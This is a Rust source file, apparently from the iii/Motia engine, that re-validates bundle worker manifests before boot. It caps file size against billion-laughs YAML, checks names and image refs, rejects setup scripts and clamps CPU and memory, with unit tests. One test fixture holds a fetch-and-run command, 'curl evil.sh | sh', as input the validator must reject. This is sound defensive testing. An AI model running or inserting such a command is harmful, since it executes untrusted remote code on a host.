// Copyright Motia LLC and/or licensed to Motia LLC under one or more
// contributor license agreements. Licensed under the Elastic License 2.0;
// you may not use this file except in compliance with the Elastic License 2.0.
// This software is patent protected. We welcome discussions - reach out at team@iii.dev
// See LICENSE and PATENTS files for details.

//! Bundle worker gates: the operator kill switch, strict manifest
//! re-validation and the resource clamp that `bundle_vm_command` applies
//! before every boot. A bundle is publisher-controlled and its install dir
//! sits on the host filesystem, so each check runs again at start.

use crate::core::error::WorkerOpError;

/// Maximum size of the `iii.worker.yaml` manifest (64 KiB).
///
/// The manifest is parsed in-process by `serde_yaml`, which (as of 0.9.x,
/// libyaml-based) does not gate exponential anchor/alias expansion. A small
/// YAML file with chained aliases can balloon to gigabytes of in-memory
/// `Value`. A 64 KiB cap means even a worst-case expansion stays under a few
/// MiB.
pub const MAX_BUNDLE_MANIFEST_BYTES: u64 = 64 * 1024;

/// Environment variable that disables the bundle worker install/start
/// pipeline entirely. Operators who don't trust the registry CDN can
/// set `III_BUNDLE_WORKERS_DISABLED=1` to refuse every bundle worker
/// install and start attempt.
pub const ENV_BUNDLE_WORKERS_DISABLED: &str = "III_BUNDLE_WORKERS_DISABLED";

/// Returns true when the operator has disabled bundle workers via the
/// `III_BUNDLE_WORKERS_DISABLED=1` environment variable.
/// `bundle_vm_command` checks this gate before any filesystem work.
pub fn bundle_workers_disabled() -> bool {
    std::env::var(ENV_BUNDLE_WORKERS_DISABLED).ok().as_deref() == Some("1")
}

pub fn validate_bundle_manifest(
    manifest_dir: &std::path::Path,
    expected_name: &str,
) -> Result<String, WorkerOpError> {
    let manifest_path = manifest_dir.join("iii.worker.yaml");
    // Cap manifest size BEFORE the read so a publisher-controlled
    // billion-laughs YAML (chained `&anchor` / `*alias` expansion) can
    // never reach serde_yaml::from_str. serde_yaml 0.9.x is libyaml-
    // based and does not gate exponential alias expansion in-tree.
    // 64 KiB is plenty for a real manifest and bounds worst-case
    // expansion to a few MiB.
    match std::fs::metadata(&manifest_path) {
        Ok(meta) if meta.len() > MAX_BUNDLE_MANIFEST_BYTES => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "iii.worker.yaml".into(),
                reason: format!(
                    "manifest is {} bytes; bundle manifests are capped at {} bytes \
                     (billion-laughs YAML defense)",
                    meta.len(),
                    MAX_BUNDLE_MANIFEST_BYTES,
                ),
            });
        }
        Ok(_) => {}
        Err(source) if source.kind() == std::io::ErrorKind::NotFound => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "iii.worker.yaml".into(),
                reason: "manifest must exist at archive root".into(),
            });
        }
        Err(source) => {
            return Err(WorkerOpError::ConfigIo {
                path: manifest_path,
                source,
            });
        }
    }

    let content = match std::fs::read_to_string(&manifest_path) {
        Ok(c) => c,
        Err(source) if source.kind() == std::io::ErrorKind::NotFound => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "iii.worker.yaml".into(),
                reason: "manifest must exist at archive root".into(),
            });
        }
        Err(source) => {
            return Err(WorkerOpError::ConfigIo {
                path: manifest_path,
                source,
            });
        }
    };

    let doc: serde_yaml::Value =
        serde_yaml::from_str(&content).map_err(|e| WorkerOpError::ConfigParse {
            path: manifest_path.clone(),
            message: format!("invalid YAML: {e}"),
        })?;

    // name must equal the install target.
    let manifest_name = doc
        .get("name")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty());
    match manifest_name {
        Some(n) if n == expected_name => {}
        Some(other) => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "name".into(),
                reason: format!(
                    "manifest declares name {other:?} but installing as {expected_name:?}"
                ),
            });
        }
        None => {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "name".into(),
                reason: "manifest must declare `name` matching the install target".into(),
            });
        }
    }

    // runtime.base_image may name any OCI image ref — the rootfs is
    // publisher-chosen, same trust context as scripts.start (which we
    // already execute). First-gate the characters here so a bad ref
    // fails at install time instead of silently falling back to the
    // kind default at start (see project.rs::load_project_info).
    if let Some(img) = doc.get("runtime").and_then(|r| r.get("base_image")) {
        let plausible = img
            .as_str()
            .map(str::trim)
            .is_some_and(super::project::is_plausible_image_ref);
        if !plausible {
            return Err(WorkerOpError::BundleManifestRejected {
                field: "runtime.base_image".into(),
                reason: "runtime.base_image must be a plausible OCI image \
                         reference (alphanumerics and `._-/:@+`), e.g. \
                         \"oven/bun:1\""
                    .into(),
            });
        }
    }

    // Reject scripts.setup (OS provisioning belongs in the preset image).
    // scripts.install is ALLOWED: it runs inside the sandbox VM exactly
    // like scripts.start (same publisher-shell trust context), and the
    // boot script's /var/.iii-prepared guard makes it run once — which
    // python bundles need for pip/browser bootstrap that can't be
    // vendored per-arch into the archive.
    if let Some(scripts) = doc.get("scripts")
        && scripts
            .get("setup")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .is_some_and(|s| !s.is_empty())
    {
        return Err(WorkerOpError::BundleManifestRejected {
            field: "scripts.setup".into(),
            reason: "bundle manifests must not declare scripts.setup; \
                     pre-build the bundle and ship it ready-to-run"
                .into(),
        });
    }

    // scripts.start is the only command we will execute. Must be a
    // non-empty shell string (matches existing local-worker rails —
    // see project.rs::load_project_info around scripts.start).
    let start = doc
        .get("scripts")
        .and_then(|s| s.get("start"))
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty());
    match start {
        Some(cmd) => Ok(cmd.to_string()),
        None => Err(WorkerOpError::BundleManifestRejected {
            field: "scripts.start".into(),
            reason: "bundle manifest must declare scripts.start as a non-empty \
                     shell string (e.g. \"node bundle.js\")"
                .into(),
        }),
    }
}

/// Default resource ceilings applied to bundle workers when the engine
/// does not provide an explicit cap. Tuned to fit on a developer laptop
/// without letting a single bundle starve the host.
///
/// These mirror the `PerImageCap` semantics in `sandbox_daemon::config`
/// but live here because bundle workers don't (yet) carry an explicit
/// base-image declaration the engine can key on. A future engine-level
/// cap can shadow this default if operators want something tighter or
/// looser.
pub const DEFAULT_BUNDLE_MAX_CPUS: u32 = 4;
pub const DEFAULT_BUNDLE_MAX_MEMORY_MB: u32 = 4096;

/// Default resources requested when a bundle manifest is silent on
/// `resources.cpus` or `resources.memory`. Matches the local-path
/// defaults so existing publishers don't have to think about it.
const DEFAULT_BUNDLE_CPUS: u32 = 2;
const DEFAULT_BUNDLE_MEMORY_MB: u32 = 2048;

/// Caps that bundle workers are clamped against. T10 will let the
/// engine override these via config; for now they're the defaults.
#[derive(Debug, Clone, Copy)]
pub struct ResourceCaps {
    pub max_cpus: u32,
    pub max_memory_mb: u32,
}

impl Default for ResourceCaps {
    fn default() -> Self {
        Self {
            max_cpus: DEFAULT_BUNDLE_MAX_CPUS,
            max_memory_mb: DEFAULT_BUNDLE_MAX_MEMORY_MB,
        }
    }
}

/// Outcome of bundle resource parsing. The `clamped_*` fields are
/// non-empty when the publisher requested more than the engine allows;
/// callers should emit a WARN event so the operator sees what happened
/// rather than silently shrinking the worker (Prime Directive: zero
/// silent failures).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolvedBundleResources {
    pub cpus: u32,
    pub memory_mb: u32,
    /// Non-`None` when `resources.cpus` exceeded `caps.max_cpus`. Carries
    /// the original request so the WARN message can name it.
    pub clamped_cpus: Option<u32>,
    /// Non-`None` when `resources.memory` exceeded `caps.max_memory_mb`.
    pub clamped_memory_mb: Option<u32>,
}

pub fn parse_bundle_resources(
    manifest_dir: &std::path::Path,
    caps: ResourceCaps,
) -> Result<ResolvedBundleResources, WorkerOpError> {
    let manifest_path = manifest_dir.join("iii.worker.yaml");
    // Same billion-laughs defense as validate_bundle_manifest: refuse
    // to even read a manifest larger than MAX_BUNDLE_MANIFEST_BYTES.
    if let Ok(meta) = std::fs::metadata(&manifest_path)
        && meta.len() > MAX_BUNDLE_MANIFEST_BYTES
    {
        return Err(WorkerOpError::BundleManifestRejected {
            field: "iii.worker.yaml".into(),
            reason: format!(
                "manifest is {} bytes; bundle manifests are capped at {} bytes \
                 (billion-laughs YAML defense)",
                meta.len(),
                MAX_BUNDLE_MANIFEST_BYTES,
            ),
        });
    }
    let content =
        std::fs::read_to_string(&manifest_path).map_err(|source| WorkerOpError::ConfigIo {
            path: manifest_path.clone(),
            source,
        })?;
    let doc: serde_yaml::Value =
        serde_yaml::from_str(&content).map_err(|e| WorkerOpError::ConfigParse {
            path: manifest_path,
            message: format!("invalid YAML in resources block: {e}"),
        })?;

    fn read_u32(doc: &serde_yaml::Value, key: &str, default: u32) -> u32 {
        match doc
            .get("resources")
            .and_then(|r| r.get(key))
            .and_then(|v| v.as_u64())
        {
            Some(n) if n <= u32::MAX as u64 => n as u32,
            Some(_overflow) => u32::MAX,
            None => default,
        }
    }

    let requested_cpus = read_u32(&doc, "cpus", DEFAULT_BUNDLE_CPUS);
    let requested_memory = read_u32(&doc, "memory", DEFAULT_BUNDLE_MEMORY_MB);

    let (cpus, clamped_cpus) = if requested_cpus > caps.max_cpus {
        (caps.max_cpus, Some(requested_cpus))
    } else {
        (requested_cpus, None)
    };
    let (memory_mb, clamped_memory_mb) = if requested_memory > caps.max_memory_mb {
        (caps.max_memory_mb, Some(requested_memory))
    } else {
        (requested_memory, None)
    };

    Ok(ResolvedBundleResources {
        cpus,
        memory_mb,
        clamped_cpus,
        clamped_memory_mb,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    // Note: `..` traversal coverage requires raw-tar-bytes construction
    // (the tar crate's Builder rejects `..` paths at write time, so the
    // attack archive cannot be built through the safe API). The
    // adversarial path tests live in T12's bundle_worker_integration.rs
    // which mirrors the raw-tar helper from binary_worker_integration.rs.

    fn write_manifest(dir: &std::path::Path, body: &str) {
        std::fs::write(dir.join("iii.worker.yaml"), body).unwrap();
    }

    #[test]
    fn validate_bundle_manifest_happy_path() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nscripts:\n  start: \"node bundle.js\"\n",
        );
        let cmd = validate_bundle_manifest(tmp.path(), "foo").expect("happy");
        assert_eq!(cmd, "node bundle.js");
    }

    #[test]
    fn validate_bundle_manifest_rejects_setup() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nscripts:\n  setup: \"curl evil.sh | sh\"\n  start: \"node x.js\"\n",
        );
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "scripts.setup");
            }
            other => panic!("expected BundleManifestRejected scripts.setup, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_accepts_install() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nscripts:\n  install: pip install -e .\n  start: python -m src.main\n",
        );
        let cmd = validate_bundle_manifest(tmp.path(), "foo").expect("install allowed");
        assert_eq!(cmd, "python -m src.main");
    }

    #[test]
    fn validate_bundle_manifest_accepts_any_base_image() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nruntime:\n  base_image: oven/bun:1\nscripts:\n  start: node x.js\n",
        );
        let cmd = validate_bundle_manifest(tmp.path(), "foo").expect("custom ref accepted");
        assert_eq!(cmd, "node x.js");
    }

    #[test]
    fn validate_bundle_manifest_rejects_implausible_base_image() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nruntime:\n  base_image: \"bad image!\"\nscripts:\n  start: node x.js\n",
        );
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "runtime.base_image");
            }
            other => panic!("expected BundleManifestRejected runtime.base_image, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_accepts_preset_base_image() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nruntime:\n  base_image: docker.io/iiidev/python:latest\nscripts:\n  start: python -m src.main\n",
        );
        let cmd = validate_bundle_manifest(tmp.path(), "foo").expect("preset ref accepted");
        assert_eq!(cmd, "python -m src.main");
    }

    #[test]
    fn validate_bundle_manifest_rejects_name_mismatch() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(tmp.path(), "name: bar\nscripts:\n  start: node x.js\n");
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "name");
            }
            other => panic!("expected BundleManifestRejected name, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_missing_start() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(tmp.path(), "name: foo\n");
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "scripts.start");
            }
            other => panic!("expected BundleManifestRejected scripts.start, got {other:?}"),
        }
    }

    #[test]
    fn validate_bundle_manifest_missing_file() {
        let tmp = tempfile::tempdir().unwrap();
        match validate_bundle_manifest(tmp.path(), "foo") {
            Err(WorkerOpError::BundleManifestRejected { field, .. }) => {
                assert_eq!(field, "iii.worker.yaml");
            }
            other => panic!("expected BundleManifestRejected iii.worker.yaml, got {other:?}"),
        }
    }

    #[test]
    fn parse_bundle_resources_uses_defaults_when_absent() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(tmp.path(), "name: foo\nscripts:\n  start: node x.js\n");
        let res = parse_bundle_resources(tmp.path(), ResourceCaps::default()).unwrap();
        assert_eq!(res.cpus, DEFAULT_BUNDLE_CPUS);
        assert_eq!(res.memory_mb, DEFAULT_BUNDLE_MEMORY_MB);
        assert!(res.clamped_cpus.is_none());
        assert!(res.clamped_memory_mb.is_none());
    }

    #[test]
    fn parse_bundle_resources_clamps_excessive_cpu() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nresources:\n  cpus: 64\n  memory: 2048\nscripts:\n  start: x\n",
        );
        let caps = ResourceCaps {
            max_cpus: 4,
            max_memory_mb: 4096,
        };
        let res = parse_bundle_resources(tmp.path(), caps).unwrap();
        assert_eq!(res.cpus, 4);
        assert_eq!(res.clamped_cpus, Some(64));
        assert!(res.clamped_memory_mb.is_none());
    }

    #[test]
    fn parse_bundle_resources_clamps_excessive_memory() {
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nresources:\n  cpus: 2\n  memory: 262144\nscripts:\n  start: x\n",
        );
        let res = parse_bundle_resources(tmp.path(), ResourceCaps::default()).unwrap();
        assert_eq!(res.cpus, 2);
        assert_eq!(res.memory_mb, DEFAULT_BUNDLE_MAX_MEMORY_MB);
        assert!(res.clamped_cpus.is_none());
        assert_eq!(res.clamped_memory_mb, Some(262144));
    }

    #[test]
    fn parse_bundle_resources_saturates_overflow_not_truncates() {
        // `.as_u64() as u32` truncates a u64 value > u32::MAX into a
        // small u32 silently. The strict parser saturates instead so
        // the clamp step sees the over-the-limit value and surfaces
        // it as `clamped_*`.
        let tmp = tempfile::tempdir().unwrap();
        write_manifest(
            tmp.path(),
            "name: foo\nresources:\n  cpus: 4294967296\n  memory: 2048\nscripts:\n  start: x\n",
        );
        let res = parse_bundle_resources(tmp.path(), ResourceCaps::default()).unwrap();
        assert_eq!(res.cpus, DEFAULT_BUNDLE_MAX_CPUS);
        // u32::MAX is what the saturating cast produces; the clamp
        // reports that value as the original request.
        assert_eq!(res.clamped_cpus, Some(u32::MAX));
    }
}
